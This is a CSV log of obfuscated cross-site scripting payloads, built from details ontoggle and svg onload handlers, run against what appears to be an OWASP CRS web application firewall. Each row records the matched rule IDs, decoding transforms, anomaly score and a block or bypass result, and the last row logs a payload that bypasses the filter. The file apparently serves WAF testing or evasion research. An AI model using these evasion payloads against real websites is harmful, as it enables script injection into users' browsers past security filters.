index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2685,"<details open ontoggle=""(function(){var x='al'+'ert';top[x](1);})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o52,4v217,69 || o56,11v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,69 || o25,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,6v217,69t:urlDecodeUni,t:compressWhitespace || ",35,178049436244.658943
2689,"<details open ontoggle=""(function(){var x=[97,108,101,114,116].map(c=>String['fromCharCode'](c)).join('');self[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o76,45v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,123 || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o106,7v217,123t:urlDecodeUni,t:compressWhitespace || ",25,178049437220.755184
2692,"<details open ontoggle=""(function(){var z=String.fromCharCode(97,108,101,114,116);window[z](1)})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,10v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,100t:urlDecodeUni,t:compressWhitespace || ",25,178049437911.483098
2695,"<details open ontoggle=""(function(){var y=atob('YWxlcnQ=');this.window[y].call(null,1)})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,9v217,92t:urlDecodeUni,t:compressWhitespace || ",20,178049438724.578028
2700,"<details open ontoggle=""(function(){var x=[97,108,101,114,116];top[x.map(c=>String.fromCharCode(c)).join('')](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o62,4v217,119 || o95,22v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,119 || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o63,46v217,119t:urlDecodeUni,t:compressWhitespace || ",30,178049440084.790858
2701,"<details open ontoggle=""(function(){var x=String['from\u0043har\u0043ode'](97,108,101,114,116);top[x](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o94,4v217,111 || o98,11v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,6v217,111t:urlDecodeUni,t:compressWhitespace || ",30,178049440273.490682
2707,"<svg onload=""(function(){var x=''[`constructor`][`constructor`]('return String')()['fromCharCode'](97,108,101,114,116);self[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o63,71v217,136t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,136 || v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o119,7v217,136t:urlDecodeUni,t:compressWhitespace || ",30,178049441695.131344
2711,"<details open ontoggle=""(function(){var s=[97,108,101,114,116];window[s.map((c)=>String.fromCharCode(c)).join('')](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o100,22v217,124t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,124 || v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o63,51v217,124t:urlDecodeUni,t:compressWhitespace || ",25,17804944268.126303
2712,"<details open ontoggle=""(function(){var a=String;var b=a['fromCharCode'];window[b(97)+'lert'](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o79,22v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || o25,11v217,103t:urlDecodeUni || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o73,20v217,103t:urlDecodeUni,t:compressWhitespace || ",30,178049442882.950278
2714,"<details open ontoggle=""(function(){var f=window[(''+({}))['constructor']['fromCharCode'](97,108,101,114,116)];f(1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,72v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,122 || o25,11v217,122t:urlDecodeUni || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,31v217,122t:urlDecodeUni,t:compressWhitespace || ",30,178049443229.504139
2719,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);top[x](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o81,4v217,98 || o85,11v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,6v217,98t:urlDecodeUni,t:compressWhitespace || ",30,178049444438.871214
2720,"<details open ontoggle=""(function(){var f='ale'+'rt';window.parent[f].call(null,1);})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,89 || o25,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178049444750.645327
2722,"<details open ontoggle=""(function(){var y=String.fromCharCode(97,108,101,114,116);top[y](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o81,4v217,98 || o85,11v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,6v217,98t:urlDecodeUni,t:compressWhitespace || ",30,178049445230.031450
2723,"<details open ontoggle=""(function(){var z=atob('YWxlcnQ=');self[''+z](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o63,14v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,10v217,79t:urlDecodeUni,t:compressWhitespace || ",30,178049445489.638241
2724,"<details open ontoggle=""(function(){var q=atob('YWxlcnQ=');globalThis[q](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o69,11v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178049445762.781680
2726,"<details open ontoggle=""(function(){var z=atob('YWxlcnQ=');self['con'+'structor']['cons'+'tructor']('ret'+'urn '+z)()(1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o63,62v217,127t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,127 || o25,11v217,127t:urlDecodeUni || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,22v217,127t:urlDecodeUni,t:compressWhitespace || ",30,17804944622.781812
2730,"<details open ontoggle=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,11v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,101t:urlDecodeUni,t:compressWhitespace || ",25,178049447287.271989
2733,"<details open ontoggle=""(function(){var z=atob('YWxlcnQ=');top[''+z](1);})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o58,4v217,78 || o62,14v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || o25,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,78t:urlDecodeUni,t:compressWhitespace || ",35,178049447872.722847
2734,"<details open ontoggle=""(function(){var y=atob('YWxlcnQ=');globalThis[y](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o69,11v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178049448170.583982
2735,"<details open ontoggle=""(function(){var k=atob('YWxlcnQ=');this['constr'+'uctor']['constr'+'uctor']('retur\u006e'+' '+k+'(1)')();})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o63,70v217,135t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,135 || o25,11v217,135t:urlDecodeUni || v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,22v217,135t:urlDecodeUni,t:compressWhitespace || ",30,178049448317.491608
2736,"<details open ontoggle=""(function(){var z=globalThis[atob('YWxlcnQ=')];z(1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178049448549.857022
2738,"<details open ontoggle=""(function(){var w=[]['constructor']['constructor'](atob('YWxlcnQ=')+'(1)')();})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o42,63v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || o25,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178049449088.146242
2739,"<details open ontoggle=""(function(){var v=parent[atob('YWxlcnQ=')];v(1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178049449292.627476
2741,"<details open ontoggle=""(function(){var w=top['\u0061lert'];w(1);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,17v217,71t:urlDecodeUni,t:compressWhitespace || ",20,178049449727.467743
2742,"<details open ontoggle=""(function(){var w=self['al'+'ert'];w(1);})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,70 || o25,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,16v217,70t:urlDecodeUni,t:compressWhitespace || ",25,178049449948.564148
2744,"<details open ontoggle=""(function(){var s=document.defaultView['\u0061\u006c\u0065\u0072\u0074'];s(1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178049450443.413988
2745,"<details open ontoggle=""(function(){var s=document.defaultView[String.fromCharCode(97,108,101,114,116)];s(1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178049450611.286802
2746,"<details open ontoggle=""(function(){var s=window[atob('YWxlcnQ')];s(1);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,23v217,77t:urlDecodeUni,t:compressWhitespace || ",20,17804945081.157144
2747,"<details open ontoggle=""(function(){var s=top['al'+'ert'];s(1);})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,69 || o25,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,15v217,69t:urlDecodeUni,t:compressWhitespace || ",25,178049451168.701432
2749,"<details open ontoggle=""this['con'+'structor']['con'+'structor']('ale'+'rt(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,53v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,22v217,83t:urlDecodeUni,t:compressWhitespace || ",20,178049451581.855667
2752,"<details open ontoggle=""(function(){var z=globalThis[atob`YWxlcnQ`];z(1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178049452230.037805
2755,"<details open ontoggle=""(function(){var w=String.fromCharCode(97,108,101,114,116);self[w](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o86,11v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,7v217,99t:urlDecodeUni,t:compressWhitespace || ",25,178049453032.579852
2756,"<details open ontoggle=""(function(){var w=atob('YWxlcnQ');parent[w](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o64,11v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17804945321.583937
2757,"<details open ontoggle=""(function(){var w=atob('YWxlcnQ');globalThis[w](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o68,11v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17804945349.818287
2765,"<details open ontoggle=""(function(){var a='ale'+'rt';window[a].apply(window,[1]);})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,87 || o25,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v217,87t:urlDecodeUni,t:compressWhitespace || ",25,178049455390.625358
2766,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');parent[a](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o65,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178049455517.342213
2767,"<details open ontoggle=""(function(){var b=atob('YWxlcnQ=');self[b]['call'](self,[1]);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o63,26v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,7v217,91t:urlDecodeUni,t:compressWhitespace || ",25,178049455787.881434
2768,"<details open ontoggle=""(function(){var c=atob('YWxlcnQ=');top[c]['bind'](top)([1]);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o58,4v217,90 || o62,26v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,6v217,90t:urlDecodeUni,t:compressWhitespace || ",30,178049456085.075981
2769,"<details open ontoggle=""(function(){var d=atob('YWxlcnQ=');document.defaultView[d](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o79,11v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178049456232.439102
2770,"<details open ontoggle=""(function(){var e=atob('YWxlcnQ=');globalThis[e].call(globalThis,1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178049456443.724917
2771,"<details open ontoggle=""(function(){var b=atob('YWxlcnQ=');[]['filter']['constructor']('return '+b+'(1)')();})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o59,53v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,114 || o25,11v217,114t:urlDecodeUni || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178049456744.511270
2772,"<details open ontoggle=""(function(){var c=atob('YWxlcnQ=');(0,eval)('('+c+')(1)');})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o67,19v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178049456938.533327
2773,"<details open ontoggle=""(function(){var d=atob('YWxlcnQ=');Function('return '+d+'(1)')();})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o67,26v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,95 || o25,11v217,95t:urlDecodeUni || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17804945713.760953
2774,"<details open ontoggle=""(function(){var e=atob('YWxlcnQ=');[].map['const\x72uctor']('return '+e+'(1)')();})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o83,26v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || o25,11v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178049457373.998569
2779,"<details open ontoggle=""(function(){var x=globalThis[String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)][String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)](atob('YWxlcnQoMSk='));return x();})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,220 || v217,220t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,220t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178049458514.371011
2782,"<details open ontoggle=""(function(){top['\u0061\u006c\u0065\u0072\u0074'](1)})()""></details>",0,1,block,6,"932105,934100,941100,941120,941370,949110","o33,6v217,92 || o25,11v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,37v217,92t:urlDecodeUni,t:compressWhitespace || ",25,17804945925.613667
2786,"<details open ontoggle=""(function(){self['ale'+'rt'](1)})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,35v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,71 || o25,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,16v217,71t:urlDecodeUni,t:compressWhitespace || ",30,178049460227.391705
2787,"<details open ontoggle=""(function(){window['\u0061\u006c\u0065\u0072\u0074'](1)})()""></details>",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,40v217,95t:urlDecodeUni,t:compressWhitespace || ",20,178049460438.633850
2788,"<details open ontoggle=""(function(){top['al'+'ert'](1)})()""></details>",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o33,6v217,70 || o24,34v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,70 || o25,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,70t:urlDecodeUni,t:compressWhitespace || ",35,178049460643.034963
2791,"<details open ontoggle=""[].constructor.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178049461319.361107
